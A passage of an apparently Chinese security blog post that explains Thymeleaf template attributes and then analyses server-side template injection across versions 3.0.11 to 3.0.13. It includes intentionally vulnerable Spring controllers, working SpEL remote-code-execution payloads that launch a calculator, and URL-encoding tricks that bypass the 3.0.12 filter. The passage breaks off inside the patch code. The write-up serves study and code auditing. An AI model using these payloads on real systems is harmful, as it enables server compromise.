+<td><code>th:alt</code>, <code>th:placeholder</code>, <code>th:onclick</code>等</td>
+<td>几乎所有标准 HTML 属性都支持</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;a th:href=&quot;@&#123;/profile(id=$&#123;userId&#125;)&#125;&quot; th:class=&quot;$&#123;isActive ? &#x27;active&#x27; : &#x27;inactive&#x27;&#125;&quot;&gt;Profile&lt;/a&gt;<br>&lt;img th:src=&quot;@&#123;/images/logo.png&#125;&quot; th:alt=&quot;#&#123;logo.alt&#125;&quot; /&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><code>th:classappend</code> / <code>th:styleappend</code></li>
+</ol>
+<p>在保留原有 class/style 的基础上追加新值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;button class=&quot;btn&quot; th:classappend=&quot;$&#123;error ? &#x27;btn-danger&#x27; : &#x27;btn-success&#x27;&#125;&quot;&gt;Submit&lt;/button&gt;<br>&lt;div style=&quot;margin: 10px;&quot; th:styleappend=&quot;$&#123;darkMode ? &#x27;background: black;&#x27; : &#x27;&#x27;&#125;&quot;&gt;Content&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<ol start="6">
+<li><code>th:if</code></li>
+</ol>
+<p>条件为 <code>true</code> 时渲染元素。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:if=&quot;$&#123;user.admin&#125;&quot;&gt;Admin Panel&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><code>th:unless</code></li>
+</ol>
+<p>条件为 <code>false</code> 时渲染（即 <code>if not</code>）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;p th:unless=&quot;$&#123;user.subscribed&#125;&quot;&gt;Please subscribe!&lt;/p&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="8">
+<li><code>th:switch</code> / <code>th:case</code></li>
+</ol>
+<p>多分支选择（类似 Java <code>switch</code>）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:switch=&quot;$&#123;user.role&#125;&quot;&gt;<br>  &lt;p th:case=&quot;&#x27;admin&#x27;&quot;&gt;Administrator&lt;/p&gt;<br>  &lt;p th:case=&quot;&#x27;manager&#x27;&quot;&gt;Manager&lt;/p&gt;<br>  &lt;p th:case=&quot;*&quot;&gt;Other&lt;/p&gt; &lt;!-- 默认情况 --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<ol start="9">
+<li><code>th:each</code></li>
+</ol>
+<p>遍历集合、数组、Map 等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- 遍历 List --&gt;<br>&lt;li th:each=&quot;item : $&#123;items&#125;&quot; th:text=&quot;$&#123;item.name&#125;&quot;&gt;Item&lt;/li&gt;<br><br>&lt;!-- 获取状态对象（index, count, even, first, last...） --&gt;<br>&lt;tr th:each=&quot;user, iterStat : $&#123;users&#125;&quot;&gt;<br>  &lt;td th:text=&quot;$&#123;iterStat.count&#125;&quot;&gt;1&lt;/td&gt;<br>  &lt;td th:text=&quot;$&#123;user.name&#125;&quot;&gt;Name&lt;/td&gt;<br>  &lt;td th:if=&quot;$&#123;iterStat.last&#125;&quot;&gt;Last row!&lt;/td&gt;<br>&lt;/tr&gt;<br><br>&lt;!-- 遍历 Map --&gt;<br>&lt;span th:each=&quot;entry : $&#123;userSettings&#125;&quot;&gt;<br>  &lt;span th:text=&quot;$&#123;entry.key&#125;&quot;&gt;key&lt;/span&gt;: &lt;span th:text=&quot;$&#123;entry.value&#125;&quot;&gt;value&lt;/span&gt;<br>&lt;/span&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<ol start="10">
+<li><code>th:insert</code></li>
+</ol>
+<p>插入片段内容到当前标签<strong>内部</strong>（保留宿主标签）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:insert=&quot;~&#123;fragments/footer :: copyright&#125;&quot;&gt;&lt;/div&gt;<br>&lt;!-- 结果：&lt;div&gt;&lt;p&gt;&amp;copy; 2025&lt;/p&gt;&lt;/div&gt; --&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="11">
+<li><code>th:replace</code></li>
+</ol>
+<p>用片段<strong>完全替换</strong>当前标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;footer th:replace=&quot;~&#123;fragments/footer :: copyright&#125;&quot;&gt;&lt;/footer&gt;<br>&lt;!-- 结果：&lt;p&gt;&amp;copy; 2025&lt;/p&gt; （&lt;footer&gt; 被替换了）--&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="12">
+<li><code>th:include</code>（ 已弃用）</li>
+</ol>
+<p>旧版用法，Thymeleaf 3+ 建议用 <code>th:insert</code> 或 <code>th:replace</code>。</p>
+<hr>
+<ol start="13">
+<li><code>th:object</code></li>
+</ol>
+<p>指定表单绑定的命令对象（通常为 ModelAttribute）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;form th:object=&quot;$&#123;userForm&#125;&quot; th:action=&quot;@&#123;/register&#125;&quot; method=&quot;post&quot;&gt;<br>  &lt;input type=&quot;text&quot; th:field=&quot;*&#123;username&#125;&quot; /&gt;<br>  &lt;input type=&quot;email&quot; th:field=&quot;*&#123;email&#125;&quot; /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="14">
+<li><code>th:field</code></li>
+</ol>
+<p>绑定表单字段到 <code>th:object</code> 指定的对象属性（自动处理 name、value、errors）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;input type=&quot;text&quot; th:field=&quot;*&#123;name&#125;&quot; /&gt;<br>&lt;!-- 等价于：<br>&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;$&#123;userForm.name&#125;&quot; <br>       th:class=&quot;$&#123;#fields.hasErrors(&#x27;name&#x27;)&#125; ? &#x27;error&#x27;&quot; /&gt;<br>--&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="15">
+<li><code>th:errors</code></li>
+</ol>
+<p>显示字段的验证错误信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;span th:errors=&quot;*&#123;email&#125;&quot; class=&quot;error&quot;&gt;Email is invalid&lt;/span&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<ol start="16">
+<li><code>th:with</code></li>
+</ol>
+<p>定义局部变量（作用域限于当前元素及其子元素）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:with=&quot;fullName=$&#123;user.firstName + &#x27; &#x27; + user.lastName&#125;&quot;&gt;<br>  &lt;p th:text=&quot;$&#123;fullName&#125;&quot;&gt;Full Name&lt;/p&gt;<br>  &lt;p th:text=&quot;$&#123;#strings.toUpperCase(fullName)&#125;&quot;&gt;UPPER&lt;/p&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="17">
+<li><code>th:assert</code></li>
+</ol>
+<p>断言，用于调试或确保条件成立（失败时抛异常）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;div th:assert=&quot;$&#123;not #lists.isEmpty(users)&#125;&quot;&gt;Users exist.&lt;/div&gt;<br></code></pre></td></tr></table></figure>
+
+<ol start="18">
+<li><code>th:remove</code></li>
+</ol>
+<p>移除元素（可用于条件移除、占位清理等）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!-- 保留内容但移除标签 --&gt;<br>&lt;span th:remove=&quot;tag&quot; th:text=&quot;$&#123;message&#125;&quot;&gt;Message&lt;/span&gt;<br>&lt;!-- 完全移除（包括内容） --&gt;<br>&lt;div th:remove=&quot;all&quot;&gt;This won&#x27;t appear&lt;/div&gt;<br><br>&lt;!-- 值：all, body, tag, all-but-first, none --&gt;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="内联表达式（Inline）"><a href="#内联表达式（Inline）" class="headerlink" title="内联表达式（Inline）"></a>内联表达式（Inline）</h4><p>虽然不是 <code>th:</code> 指令，但密切相关：</p>
+<p>内联文本 <code>[[...]]</code>（等价于 <code>th:text</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;p&gt;Hello, [[$&#123;user.name&#125;]]!&lt;/p&gt;          &lt;!-- 转义输出 --&gt;<br>&lt;p&gt;Hello, [($&#123;user.name&#125;)]!&lt;/p&gt;          &lt;!-- 不转义（HTML） --&gt;<br></code></pre></td></tr></table></figure>
+
+<p>需启用内联（默认开启），或显式声明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;p th:inline=&quot;text&quot;&gt;Hello, [[$&#123;name&#125;]]!&lt;/p&gt;<br></code></pre></td></tr></table></figure>
+
+<p>内联 JavaScript <code>[(...)]</code>（等价于 <code>th:utext</code>，常用于 JS 变量）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;script th:inline=&quot;javascript&quot;&gt;<br>  var userId = /*[[$&#123;userId&#125;]]*/ 0;<br>  var messages = /*[[$&#123;messages&#125;]]*/ [];<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>需开启内联：<code>th:inline=&quot;text&quot;</code> 或 <code>th:inline=&quot;javascript&quot;</code></p>
+<h3 id="攻击面-1"><a href="#攻击面-1" class="headerlink" title="攻击面"></a>攻击面</h3><p>thymeleaf的ssti实际上注入的是<font style="color:rgb(77, 77, 77);">SpEL表达式(Spring Expression Language)。</font></p>
+<p><font style="color:rgb(77, 77, 77);">代码审计重点：</font></p>
+<ul>
+<li><font style="color:rgb(77, 77, 77);">thymeleaf&lt;3.0.14</font></li>
+<li><font style="color:rgb(77, 77, 77);">thymeleaf通过return来寻找模板，需要return 参数可控</font></li>
+<li><font style="color:rgb(77, 77, 77);">或者没有return而通过url路径来寻找模板</font></li>
+</ul>
+<h4 id="3-0-11"><a href="#3-0-11" class="headerlink" title="3.0.11"></a>3.0.11</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  lang ;  <span class="hljs-comment">//直接可控</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-string">&quot;test/&quot;</span>+lang+<span class="hljs-string">&quot;/admin&quot;</span> ;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//在 Thymeleaf 3.0 版本支持片段选择器。如果片段参数可控，则造成 RCE 漏洞。</span><br><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;welcome::&quot;</span>+lang ;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//或者</span><br><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> lang+<span class="hljs-string">&quot;::welcome&quot;</span> ;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//不用return，URL 作为视图</span><br><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PathVariable;<br><br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path/&#123;eval&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String eval)</span> &#123;<br>    &#125;<br>    &#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().<span class="hljs-built_in">exec</span>(%22calc%<span class="hljs-number">22</span>).getInputStream()).<span class="hljs-built_in">next</span>()%7d__::x<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766482168153-f5e53652-77a7-4ae3-9e3c-8ef6ec5b5318.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%<span class="hljs-number">22</span>).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766482793030-98c68bc1-f6d0-436d-bff0-c9d786778a8e.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="3-0-12"><a href="#3-0-12" class="headerlink" title="3.0.12"></a>3.0.12</h4><p>pom</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;parent&gt;<br>    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;<br>    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">2.5</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>    &lt;relativePath/&gt; <br>&lt;/parent&gt;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51, 51, 51);">在这个版本中在</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;util&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">目录添加了</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;SpringStandardExpressionUtils.java&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">文件</font></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.11.RELEASE...thymeleaf-spring5-3.0.12.RELEASE"><font style="color:rgb(39, 116, 201);">https://github.com/thymeleaf/thymeleaf/compare/thymeleaf-spring5-3.0.11.RELEASE…thymeleaf-spring5-3.0.12.RELEASE</font></a></p>
+<p><font style="color:rgb(51, 51, 51);">其主要逻辑是首先 倒序检测是否包含</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;wen&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">关键字、在</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;(&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">的左边的字符是否是</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;T&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">，如包含，那么认为找到了一个实例化对象，返回</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;true&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">，阻止该表达式的执行</font></p>
+<p><font style="color:rgb(51, 51, 51);">因此绕过这个函数的检测的方法：</font></p>
+<p><font style="color:rgb(51, 51, 51);">1、表达式中不能含有关键字</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;new&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">2、在</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;(&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">的左边的字符不能是</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;T&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">3、不能在</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;T&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">和</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;(&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">中间添加的字符使得原表达式出现问题</font></p>
+<p><font style="color:rgb(51, 51, 51);">可以在</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;T&lt;/font&gt;``&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;(&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">之间使用绕过的字符</font></p>
+<ul>
+<li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;%20&lt;/font&gt;</code></li>
+<li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;%0a&lt;/font&gt;</code></li>
+<li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;%09&lt;/font&gt;</code></li>
+<li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;%0d&lt;/font&gt;</code></li>
+<li><code>&lt;font style=&quot;color:rgb(51, 51, 51);&quot;&gt;%00&lt;/font&gt;</code></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>)&#125;__::.x<br><span class="hljs-comment">//编码后</span><br>__%<span class="hljs-number">24</span>%7BT%<span class="hljs-number">20</span>(java.lang.Runtime).getRuntime().exec(%22calc%<span class="hljs-number">22</span>)%7D__%3A%3A.x<br></code></pre></td></tr></table></figure>
+
+<p>在用url路径视图的时候</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path/&#123;eval&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String eval)</span> &#123;<br>    &#125;<br>    &#125;<br><br><span class="hljs-comment">//使用payload</span><br>/path;/__%<span class="hljs-number">24</span>%7BT%<span class="hljs-number">20</span>(java.lang.Runtime).getRuntime().exec(%22calc%<span class="hljs-number">22</span>)%7D__%3A%3A.x<br><br><span class="hljs-comment">//或者</span><br>/path<span class="hljs-comment">//__%24%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__%3A%3A.x</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3-0-13"><a href="#3-0-13" class="headerlink" title="3.0.13"></a>3.0.13</h4><p><font style="color:rgb(77, 77, 77);">改动在</font><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;SpringStandardExpressionUtils#containsSpELInstantiationOrStatic&lt;/font&gt;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsSpELInstantiationOrStatic</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String expression)</span> &#123;<br>       <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">explen</span> <span class="hljs-operator">=</span> expression.length();<br>       <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> explen;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">ni</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">si</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>       <span class="hljs-type">char</span> c;<br>       <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br>           c = expression.charAt(n);<br>           <span class="hljs-keyword">if</span> (ni &lt; NEW_LEN<br>                   &amp;&amp; c == NEW_ARRAY[ni]<br>                   &amp;&amp; (ni &gt; <span class="hljs-number">0</span> || ((n + <span class="hljs-number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>))))) &#123;<br>               ni++;<br>               <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                   <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>               &#125;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>               n += ni;<br>               ni = <span class="hljs-number">0</span>;<br>               <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                   si = -<span class="hljs-number">1</span>;<br>               &#125;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           ni = <span class="hljs-number">0</span>;<br>           <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>               si = n;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span><br>                       &amp;&amp; ((n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) &amp;&amp; isPreviousStaticMarker(expression, n))) &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>               si = -<span class="hljs-number">1</span>;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isPreviousStaticMarker</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String expression, <span 